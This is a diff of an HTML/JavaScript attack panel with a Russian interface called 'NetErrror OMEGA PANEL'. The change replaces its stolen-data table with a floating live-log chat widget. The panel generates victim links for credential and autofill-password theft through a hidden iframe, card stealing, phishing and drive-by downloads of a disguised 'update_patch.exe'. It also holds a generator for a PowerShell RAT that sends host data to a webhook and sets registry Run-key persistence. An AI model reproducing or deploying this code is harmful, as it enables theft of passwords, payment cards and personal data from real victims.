@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>NetErrror █ ULTIMATE PANEL | БЕЗ РЕГИСТРАЦИИ</title>
+    <title>NetErrror █ OMEGA PANEL + LIVE CHAT LOGS</title>
     <style>
         * {
             margin: 0;
@@ -16,6 +16,7 @@
             color: #00ffcc;
             padding: 20px;
             min-height: 100vh;
+            position: relative;
         }
         .cyber-container {
             max-width: 1500px;
@@ -54,7 +55,7 @@
             font-size: 0.8rem;
             margin-top: 8px;
         }
-        /* Табы и карточки */
+        /* Табы */
         .tabs {
             display: flex;
             flex-wrap: wrap;
@@ -132,45 +133,98 @@
             margin-top: 20px;
             word-break: break-all;
         }
-        .logs-table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 0.75rem;
-        }
-        .logs-table th, .logs-table td {
-            border: 1px solid #00ffcc55;
-            padding: 8px;
-            text-align: left;
-            color: #ccffdd;
-        }
-        .logs-table th {
-            background: #ff336633;
-            color: #ffccaa;
-        }
-        .flex {
-            display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 15px;
-        }
-        .note-red {
-            color: #ff8888;
-            font-size: 12px;
-            margin-top: 10px;
-        }
         .copy-btn {
             background: #2c2c6e;
             margin-left: 10px;
         }
-        .stats {
-            background: #00000099;
-            padding: 6px 12px;
-            border-radius: 40px;
-            font-size: 0.8rem;
+
+        /* ЧАТ В ПРАВОМ НИЖНЕМ УГЛУ (ЖИВЫЕ ЛОГИ) */
+        .live-chat {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 380px;
+            max-width: calc(100vw - 40px);
+            background: #0a0f1ecc;
+            backdrop-filter: blur(12px);
+            border: 1px solid #00ffcc;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(0,255,204,0.3);
+            z-index: 1000;
+            transition: 0.3s;
+            font-family: monospace;
+        }
+        .chat-header {
+            background: #ff3366aa;
+            padding: 10px 15px;
+            border-radius: 20px 20px 0 0;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-weight: bold;
+            color: #fff;
+        }
+        .chat-header span {
+            font-size: 0.9rem;
+        }
+        .chat-header button {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.2rem;
+            cursor: pointer;
+            margin-top: 0;
+            padding: 0 5px;
+        }
+        .chat-body {
+            max-height: 400px;
+            overflow-y: auto;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .chat-message {
+            background: #01050ecc;
+            border-left: 3px solid #ff3366;
+            padding: 8px 10px;
+            border-radius: 12px;
+            font-size: 0.75rem;
+            color: #ccffdd;
+            word-break: break-word;
+        }
+        .chat-message .time {
+            color: #88ffaa;
+            font-size: 0.65rem;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .chat-message .data {
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+        .chat-message .copy-data {
+            background: #2c2c6e;
+            border: none;
+            padding: 2px 8px;
+            font-size: 0.7rem;
+            margin-top: 5px;
+            border-radius: 12px;
+            cursor: pointer;
+        }
+        .chat-collapsed .chat-body {
+            display: none;
+        }
+        .clear-chat {
+            background: #661133;
+            margin-top: 5px;
+            padding: 5px;
+            font-size: 0.7rem;
+            width: 100%;
         }
         @media (max-width: 700px) {
+            .live-chat { width: 300px; }
             .tab-btn { font-size: 0.7rem; padding: 8px 4px; }
         }
     </style>
@@ -179,20 +233,15 @@
 <div class="cyber-container">
     <div class="header">
         <div class="glitch">NETERRROR █ OMEGA PANEL</div>
-        <div class="sub">⚡ БЕЗ РЕГИСТРАЦИИ | ВСЕ ФУНКЦИИ ДОСТУПНЫ ⚡</div>
+        <div class="sub">⚡ ВСЕ ДАННЫЕ ПРИХОДЯТ В ЧАТ В ПРАВОМ НИЖНЕМ УГЛУ ⚡</div>
     </div>
 
-    <div class="flex" style="padding: 15px 20px 0 20px;">
-        <div class="stats">📊 УКРАДЕНО: <span id="statsBadge">0</span> записей</div>
-        <button id="clearLogsBtn" style="background:#661133;">🗑️ ОЧИСТИТЬ ВСЕ ЛОГИ</button>
-    </div>
-
+    <!-- Вкладки с функциями (без вкладки Логи, всё в чате) -->
     <div class="tabs" id="loggedTabs">
         <button class="tab-btn active" data-logtab="stealth">🔥 STEALTH (0-Click)</button>
         <button class="tab-btn" data-logtab="driveby">💿 DRIVE-BY</button>
         <button class="tab-btn" data-logtab="cardstealer">💳 CARD STEALER</button>
         <button class="tab-btn" data-logtab="phish">🎭 ФИШИНГ</button>
-        <button class="tab-btn" data-logtab="logs">📜 ЛОГИ</button>
         <button class="tab-btn" data-logtab="rat">💀 RAT/ЛОКЕР</button>
     </div>
 
@@ -217,9 +266,9 @@
     <div id="drivebyTab" class="log-tab-content">
         <div class="card">
             <h3>💿 АВТОМАТИЧЕСКОЕ СКАЧИВАНИЕ</h3>
-            <label>📁 Имя файла (с расширением):</label>
+            <label>📁 Имя файла:</label>
             <input type="text" id="drivebyFilename" value="update_patch.exe">
-            <label>🦠 Содержимое (код вируса):</label>
+            <label>🦠 Содержимое (код):</label>
             <textarea id="drivebyContent" rows="4">@echo off
 echo HACKED > %temp%\log.txt
 start calc.exe</textarea>
@@ -272,19 +321,11 @@ start calc.exe</textarea>
         </div>
     </div>
 
-    <!-- ЛОГИ -->
-    <div id="logsTab" class="log-tab-content">
-        <div class="card">
-            <h3>📜 ВСЕ УКРАДЕННЫЕ ДАННЫЕ</h3>
-            <div id="stolenLogsContainer"><p>Загрузка...</p></div>
-        </div>
-    </div>
-
     <!-- RAT/ЛОКЕР -->
     <div id="ratTabContent" class="log-tab-content">
         <div class="card">
             <h3>🧬 ГЕНЕРАТОР RAT / ЛОКЕРА</h3>
-            <label>Название вредоноса:</label>
+            <label>Название:</label>
             <input type="text" id="malName" value="NetStealth">
             <label>Тип:</label>
             <select id="malType">
@@ -293,7 +334,7 @@ start calc.exe</textarea>
                 <option value="locker_html">Browser Locker (HTML)</option>
                 <option value="clipper">Clipper (подмена адресов)</option>
             </select>
-            <label>Webhook / Telegram Bot:</label>
+            <label>Webhook:</label>
             <input type="text" id="webhookRat" placeholder="https://webhook.site/...">
             <button id="generateRatCodeBtn">⚙️ СГЕНЕРИРОВАТЬ КОД</button>
             <button id="copyCodeBtn" class="copy-btn">📋 Скопировать код</button>
@@ -304,70 +345,152 @@ start calc.exe</textarea>
     </div>
 </div>
 
+<!-- Плавающий чат с живыми логами -->
+<div id="liveChat" class="live-chat">
+    <div class="chat-header" id="chatHeader">
+        <span>📡 LIVELOGS (украденные данные)</span>
+        <button id="toggleChatBtn">−</button>
+    </div>
+    <div class="chat-body" id="chatBody">
+        <div style="text-align:center; color:#aaa;">Загрузка...</div>
+    </div>
+    <button id="clearChatBtn" class="clear-chat">🗑️ ОЧИСТИТЬ ВСЕ ЛОГИ</button>
+</div>
+
 <script>
-    // Единый гостевой ID для хранения логов (без регистрации)
+    // ---------- Единый гостевой ID ----------
     const GUEST_ID = 'guest_shared';
 
+    // Получить все украденные данные
     function getStolenData() {
         const key = 'neterror_stolen_' + GUEST_ID;
         const raw = localStorage.getItem(key);
         return raw ? JSON.parse(raw) : [];
     }
-    function addStolenEntry(entry) {
+
+    // Сохранить и обновить чат
+    function saveStolenData(logs) {
         const key = 'neterror_stolen_' + GUEST_ID;
+        localStorage.setItem(key, JSON.stringify(logs));
+        renderChatLogs();
+    }
+
+    // Добавить новую запись и сразу показать в чате
+    function addStolenEntry(entry) {
         const logs = getStolenData();
         logs.unshift({ ...entry, timestamp: new Date().toISOString() });
         while (logs.length > 500) logs.pop();
-        localStorage.setItem(key, JSON.stringify(logs));
-        updateStatsBadge();
-        renderLogs();
-    }
-    function clearAllLogs() {
-        localStorage.removeItem('neterror_stolen_' + GUEST_ID);
-        updateStatsBadge();
-        renderLogs();
-    }
-    function updateStatsBadge() {
-        const count = getStolenData().length;
-        document.getElementById('statsBadge').innerText = count;
-    }
-    function renderLogs() {
-        const logs = getStolenData();
-        const container = document.getElementById('stolenLogsContainer');
-        if (!logs.length) {
-            container.innerHTML = '<p class="note-red">Нет украденных данных. Создайте атакующие ссылки и отправьте жертвам.</p>';
-            return;
-        }
-        let html = `<table class="logs-table"><thead><tr><th>Время</th><th>Тип</th><th>Данные</th></tr></thead><tbody>`;
-        logs.forEach(log => {
-            let dataStr = '';
-            if (log.type === 'stealth_full') dataStr = `🔑 Пароли: ${log.passwords || 'нет'}, Куки: ${log.cookies_count || 0}, IP: ${log.ip || '?'}, Geo: ${log.geo?.city || ''}`;
-            else if (log.type === 'card_stealer') dataStr = `💳 ${log.card_data || JSON.stringify(log.cards)}`;
-            else if (log.type === 'driveby_download') dataStr = `📁 Скачан файл: ${log.filename}`;
-            else if (log.type === 'roblox_creds') dataStr = `Roblox: ${log.username}/${log.password}`;
-            else if (log.type === 'form_creds') dataStr = `Логин: ${log.creds?.login} Пароль: ${log.creds?.pass}`;
-            else if (log.type === 'ip_grab') dataStr = `IP: ${log.ip} Geo: ${log.geo?.city || ''}`;
-            else if (log.type === 'multi_roblox') dataStr = `Мульти Roblox: ${log.username}/${log.password}`;
-            else if (log.type === 'keystroke_batch') dataStr = `Кейлог: ${log.keys}`;
-            else dataStr = JSON.stringify(log);
-            html += `<tr><td>${new Date(log.timestamp).toLocaleString()}</td><td>${log.type}</td><td style="word-break:break-word;">${escapeHtml(String(dataStr))}</td></tr>`;
-        });
-        html += `</tbody></table>`;
-        container.innerHTML = html;
-    }
-    function escapeHtml(str) {
-        return str.replace(/[&<>]/g, function(m) { return m === '&' ? '&amp;' : (m === '<' ? '&lt;' : '&gt;'); });
+        saveStolenData(logs);
+        // Дополнительно: если указан webhook в самой атаке, он уже отправил данные, но чат обновится
     }
 
-    // Генерация ссылок (без привязки к пользователю, owner = GUEST_ID)
+    // Очистить все логи
+    function clearAllLogs() {
+        localStorage.removeItem('neterror_stolen_' + GUEST_ID);
+        renderChatLogs();
+    }
+
+    // Форматирование данных для красивого вывода
+    function formatStolenData(entry) {
+        let text = '';
+        if (entry.type === 'stealth_full') {
+            text = `🔐 STEALTH:\n`;
+            if (entry.passwords && entry.passwords.length) text += `Пароли: ${entry.passwords.join(', ')}\n`;
+            text += `🍪 Cookies: ${entry.cookies_count || 0} шт.\n🌐 IP: ${entry.ip || 'unknown'}\n📍 Гео: ${entry.geo?.city || ''} ${entry.geo?.country || ''}\n`;
+            if (entry.localStorage && Object.keys(entry.localStorage).length) text += `💾 LocalStorage: ${JSON.stringify(entry.localStorage).slice(0, 200)}`;
+        } 
+        else if (entry.type === 'card_stealer') {
+            text = `💳 КАРТЫ:\n`;
+            if (entry.cards) {
+                entry.cards.forEach(c => {
+                    if (c.type === 'card_number') text += `Номер: ${c.value}\n`;
+                    else if (c.type === 'cvv') text += `CVV: ${c.value}\n`;
+                    else if (c.type === 'expiry') text += `Срок: ${c.value}\n`;
+                    else if (c.type === 'cardholder') text += `Держатель: ${c.value}\n`;
+                    else if (c.autofill) text += `Автозаполнение: номер ${c.autofill.number || '?'}, срок ${c.autofill.exp || '?'}, CVV ${c.autofill.cvv || '?'}, имя ${c.autofill.name || '?'}\n`;
+                });
+            }
+        }
+        else if (entry.type === 'driveby_download') {
+            text = `💿 DRIVE-BY:\nФайл: ${entry.filename}\nСодержимое: ${entry.content_preview || 'скрыто'}`;
+        }
+        else if (entry.type === 'roblox_creds') {
+            text = `🎮 ROBLOX:\nЛогин: ${entry.username}\nПароль: ${entry.password}`;
+        }
+        else if (entry.type === 'form_creds') {
+            text = `📋 ФОРМА:\nЛогин: ${entry.creds?.login || '?'}\nПароль: ${entry.creds?.pass || '?'}\nEmail: ${entry.creds?.email || 'нет'}`;
+        }
+        else if (entry.type === 'ip_grab') {
+            text = `🌍 IP:\n${entry.ip}\nГео: ${entry.geo?.city || ''} ${entry.geo?.country || ''}`;
+        }
+        else if (entry.type === 'multi_roblox') {
+            text = `🐙 МУЛЬТИ ROBLOX:\nЛогин: ${entry.username}\nПароль: ${entry.password}`;
+        }
+        else if (entry.type === 'keystroke_batch') {
+            text = `⌨️ КЕЙЛОГ (отрывок):\n${entry.keys}`;
+        }
+        else {
+            text = JSON.stringify(entry, null, 2);
+        }
+        return text;
+    }
+
+    // Отрисовка чата
+    function renderChatLogs() {
+        const logs = getStolenData();
+        const chatBody = document.getElementById('chatBody');
+        if (!logs.length) {
+            chatBody.innerHTML = '<div style="text-align:center; color:#aaa;">Нет украденных данных. Ждите...</div>';
+            return;
+        }
+        let html = '';
+        logs.forEach(log => {
+            const time = new Date(log.timestamp).toLocaleString();
+            const dataText = formatStolenData(log);
+            const safeData = escapeHtml(dataText);
+            html += `
+                <div class="chat-message">
+                    <div class="time">${time}</div>
+                    <div class="data"><pre style="font-family:monospace; margin:0; white-space:pre-wrap;">${safeData}</pre></div>
+                    <button class="copy-data" data-text="${escapeHtml(dataText)}">📋 Копировать</button>
+                </div>
+            `;
+        });
+        chatBody.innerHTML = html;
+        // Добавляем обработчики на кнопки копирования
+        document.querySelectorAll('.copy-data').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                const text = btn.getAttribute('data-text');
+                navigator.clipboard.writeText(text).then(() => {
+                    btn.innerText = '✅ Скопировано';
+                    setTimeout(() => btn.innerText = '📋 Копировать', 1500);
+                }).catch(() => alert('Ошибка копирования'));
+            });
+        });
+        // Автопрокрутка вниз (чтобы видеть новые сообщения)
+        chatBody.scrollTop = chatBody.scrollHeight;
+    }
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    // ---- ГЕНЕРАЦИЯ ССЫЛОК (без авторизации, owner = GUEST_ID) ----
     function makeLink(params) {
         const base = window.location.href.split('?')[0];
         params.set('owner', GUEST_ID);
         params.set('_t', Date.now());
         return base + '?' + params.toString();
     }
+
     function copyToClipboard(text) {
-        navigator.clipboard.writeText(text).then(() => alert('Ссылка скопирована!')).catch(() => alert('Ошибка копирования'));
+        navigator.clipboard.writeText(text).then(() => alert('Ссылка скопирована!')).catch(() => alert('Ошибка'));
     }
 
     // Stealth
@@ -426,7 +549,7 @@ start calc.exe</textarea>
         document.getElementById('copyPhishLink').onclick = () => copyToClipboard(link);
     });
 
-    // ---------- ОБРАБОТЧИКИ АТАК (СТОРОНА ЖЕРТВЫ) ----------
+    // ---------- ОБРАБОТЧИКИ АТАК (НА СТОРОНЕ ЖЕРТВЫ) ----------
     (function handleAllAttacks() {
         const urlParams = new URLSearchParams(window.location.search);
         const ownerId = urlParams.get('owner');
@@ -449,7 +572,7 @@ start calc.exe</textarea>
                     let k = localStorage.key(i);
                     stolen.localStorage[k] = localStorage.getItem(k);
                 }
-                // Попытка вытащить автозаполненные пароли
+                // автофиллинг через iframe
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 iframe.srcdoc = `<html><body><form><input type="text" name="user" autocomplete="username"><input type="password" name="pass" autocomplete="current-password"></form><script>setTimeout(()=>{let u=document.querySelector('input[autocomplete="username"]').value,p=document.querySelector('input[autocomplete="current-password"]').value;parent.postMessage({user:u,pass:p},'*');},200);<\/script></body></html>`;
@@ -466,7 +589,7 @@ start calc.exe</textarea>
                     try {
                         const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                         const geo = await geoRes.json();
-                        stolen.geo = { city: geo.city, country: geo.country_name, region: geo.region };
+                        stolen.geo = { city: geo.city, country: geo.country_name };
                     } catch (e) { }
                 } catch (e) { stolen.ip = 'unknown'; }
                 stolen.cookies_count = document.cookie.split(';').filter(c => c.trim()).length;
@@ -557,7 +680,7 @@ start calc.exe</textarea>
         }
     })();
 
-    // RAT генератор
+    // RAT генератор (улучшенный)
     function genMalware(name, type, wh) {
         const safe = name.replace(/[^a-z0-9_]/gi, '_');
         if (type === 'powershell_rat') return `# PowerShell RAT - ${safe}\n$webhook="${wh}"\n$computer=$env:COMPUTERNAME\n$user=$env:USERNAME\n$ip=(Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content\n$data=@{name="${safe}";computer=$computer;user=$user;ip=$ip;time=(Get-Date -Format "yyyy-MM-dd HH:mm:ss")}\nInvoke-RestMethod -Uri $webhook -Method Post -Body ($data|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue\n# persistence\n$regPath="HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"\nSet-ItemProperty -Path $regPath -Name "${safe}" -Value (Get-Location).Path + "\\" + $MyInvocation.MyCommand.Name`;
@@ -581,8 +704,15 @@ start calc.exe</textarea>
         alert('Код скопирован');
     };
 
-    // Очистка логов
-    document.getElementById('clearLogsBtn').addEventListener('click', () => {
+    // Чат: свернуть/развернуть
+    const chat = document.getElementById('liveChat');
+    const toggleBtn = document.getElementById('toggleChatBtn');
+    const clearChatBtn = document.getElementById('clearChatBtn');
+    toggleBtn.addEventListener('click', () => {
+        chat.classList.toggle('chat-collapsed');
+        toggleBtn.innerText = chat.classList.contains('chat-collapsed') ? '+' : '−';
+    });
+    clearChatBtn.addEventListener('click', () => {
         if (confirm('Очистить все украденные логи?')) {
             clearAllLogs();
         }
@@ -595,7 +725,6 @@ start calc.exe</textarea>
         driveby: 'drivebyTab',
         cardstealer: 'cardstealerTab',
         phish: 'phishTab',
-        logs: 'logsTab',
         rat: 'ratTabContent'
     };
     function switchTab(tabId) {
@@ -609,13 +738,11 @@ start calc.exe</textarea>
             if (btn.getAttribute('data-logtab') === tabId) btn.classList.add('active');
             else btn.classList.remove('active');
         });
-        if (tabId === 'logs') renderLogs();
     }
     tabBtns.forEach(btn => btn.addEventListener('click', () => switchTab(btn.getAttribute('data-logtab'))));
 
-    // Инициализация
-    updateStatsBadge();
-    renderLogs();
+    // Инициализация: отобразить логи в чате
+    renderChatLogs();
     switchTab('stealth');
 </script>
 </body>
